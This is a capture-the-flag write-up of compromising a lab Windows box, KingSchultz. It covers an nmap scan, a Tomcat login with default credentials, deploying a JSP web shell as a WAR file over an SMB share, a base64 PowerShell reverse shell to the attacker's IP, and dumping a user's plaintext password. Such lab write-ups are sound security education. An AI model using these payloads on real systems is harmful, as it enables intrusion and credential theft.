![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/612680f5-6fd6-4639-9e17-9265d2440b19)

first enumeration using nmap

```
# Nmap 7.93 scan initiated Mon Jun 12 04:23:29 2023 as: nmap -sC -sV -oN normal.txt -p 135,139,445,3389,8009,8080,8089,47001 -Pn 10.150.150.147
Nmap scan report for KingSchultz (10.150.150.147)
Host is up (0.16s latency).

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: KINGSCHULTZ
|   NetBIOS_Domain_Name: KINGSCHULTZ
|   NetBIOS_Computer_Name: KINGSCHULTZ
|   DNS_Domain_Name: KingSchultz
|   DNS_Computer_Name: KingSchultz
|   Product_Version: 6.1.7601
|_  System_Time: 2023-06-12T03:25:16+00:00
|_ssl-date: 2023-06-12T03:25:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=KingSchultz
| Not valid before: 2023-06-11T02:02:17
|_Not valid after:  2023-12-11T02:02:17
8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http               Apache Tomcat 8.5.32
|_http-title: Site doesn't have a title.
|_http-open-proxy: Proxy might be redirecting requests
8089/tcp  open  ssl/http           Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T13:36:37
|_Not valid after:  2022-10-24T13:36:37
|_http-server-header: Splunkd
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-06-12T03:25:15
|_  start_date: 2020-04-02T14:01:26
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: KingSchultz
|   NetBIOS computer name: KINGSCHULTZ\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-12T03:25:17+00:00
|_clock-skew: mean: 1s, deviation: 2s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 12 04:25:26 2023 -- 1 IP address (1 host up) scanned in 118.11 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/db347781-de75-43f1-ba07-f5d66464de29)

noticed the webserver on port 8080 is running `apache tomcat` service.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ab5357a7-8b4d-4dcd-b017-756b84018158)

navigate to the `/host-manager` dir, logged in with default creds `tomcat:tomcat`. let's get RCE. after some research, finna found a way to get RCE through `/host-manager` cause it does not have a file upload function. let's 's go

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/daf194d8-f867-4327-9f6b-5053bf9caf13)

first fire up impacket-smbserver command: `impacket-smbserver share -smb2support .`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/84f1b11e-b0ad-4dab-93af-c6fbef1f8e8b)

try to connect to the smbserver, 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/586b99a7-c18c-4ec1-a691-f631642f6b7c)

bingo!, we connected to the smbserver. now let's generate a war file.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz]
└─$ cat index.jsp                   
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz]
└─$ cp index.jsp webshell
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz]
└─$ cd webshell          
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz/webshell]
└─$ jar -cvf ../webshell.war *
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)                                                                                                                                                                      
```
cool we have our war file created now let's deploy.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz]
└─$ ls -al webshell.war                
-rw-r--r-- 1 n16hth4wk n16hth4wk 790 Jun 12 04:46 webshell.war
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/kingschultz]
└─$ cat /etc/hosts | grep kingschultz
10.150.150.147  kingschultz 
```
 The deployment is done remotely, and the files are stored on our machineine. To access our backdoor, Tomcat uses the alias, which means it might be necessary to add the server’s IP in the /etc/hosts with vhost that we used for deployment.
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2cf55fa9-677e-4d13-b201-7eebbe63132f)

deploy the war file,

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9c4bd2ae-4c62-447f-857c-51d4240f0c64)

tomcat connecting to th smbserver for deployment of war file. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/40ecb35d-b13c-4c37-810c-bb5f349dc816)

confirmed the backdoor was deployed sucessfully and ran a command `systeminfo`. let's pop a reverse shell.

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgA2AC4ANgA3AC4AMQAwADIAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
powershell base64 reverse shell payload...

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/48dda31f-039f-42f6-99f1-93396c74f540)

Bankai!!! got a reverse shell as `nt authority\system`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/50ff5fd3-5ed2-4cd9-9dae-69c29e518b1c)

and we are through 😉 fun box innit


## Getting another box (fritz-sever) creds 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7b28fa0d-59d7-4a09-8c20-78da3ea0469d)

in the txt file in `DrSchultz` desktop, we can see it is connected to `10.150.150.232`, let's dump lsasam hash.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/013d114d-cdc7-4aa3-a752-578c42002c15)

spawn a metepreter shell and dump the creds for user `DrSchultz`. we can see the password `AlexandreDumasIsBlack1`.
